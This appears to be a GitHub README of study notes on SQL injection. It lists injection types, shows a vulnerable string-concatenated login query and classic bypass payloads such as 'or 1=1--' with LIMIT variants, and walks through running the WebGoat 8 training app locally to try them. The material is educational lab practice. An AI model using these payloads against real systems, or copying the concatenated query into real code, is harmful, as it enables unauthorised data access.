# SQL-Injection

## Impact of SQL Injection :

- Extract sensitive information

- Misusing authentication details

- Delete data & Drop tables

## Types of SQL Injection

SQL Injection

1. In-Band SQLi
   
     a. Error Based
     
     b. Union Based
     
2. Blind SQLi

     a. Boolean Based
     
     b. Time Based
    
3. Out of bound SQLi

## SQL Injection 

   SAMPLE:
   
   $statement = " SELECT * FROM users WHERE username = '$user' AND password = '$password' ";
   
   $statement = " SELECT * FROM users WHERE username = 'Dowlath' AND password = 'dowlath' ";
   
   HACKER:
   
   $statement = " SELECT * FROM users WHERE username = 'Dowlath OR '1' == '1' --' AND password = '$password' ";
   
   Example :
   
   Smith' or '1'='1

   Smith' or 1=1--

   Content is  only one user: Plane' or 1=1 LIMIT 1-- 

   if you want to get 5 users.

   Content is  only one user: Plane' or 1=1 LIMIT 5-- 

## TEST

1. Google find " webgoat8 "

2. Download github jar file from corresponding location.

3. If you downloaded latest version *.jar file , it will support latest version of java. So before run the jar file check once you java -version.

4. Run the jar file => D:\Spring-Boot-Security\sql-injection-webgoat-8.0>java -jar "webgoat-server-8.0.0.M17.jar"

5. Login in the browser -> http://localhost:8080/WebGoat/login

 ![login](https://user-images.githubusercontent.com/9671419/87229033-963eef00-c3c2-11ea-823e-dfbb428e860e.PNG)

6. If you are not registered create the user and access.

7. Execute the sql inject commands.

   As follows patterns,
   
   Smith' or '1'='1

   Smith' or 1=1--

   Content is  only one user: Plane' or 1=1 LIMIT 1-- 

   if you want to get 5 users.

   Content is  only one user: Plane' or 1=1 LIMIT 5--    
  
![webgoat_2](https://user-images.githubusercontent.com/9671419/87229035-97701c00-c3c2-11ea-9eeb-785e3aeaa679.PNG)

![screen-shot-2018-06-29-at-53856-pm](https://user-images.githubusercontent.com/9671419/87229036-9808b280-c3c2-11ea-9638-eba871456918.png)
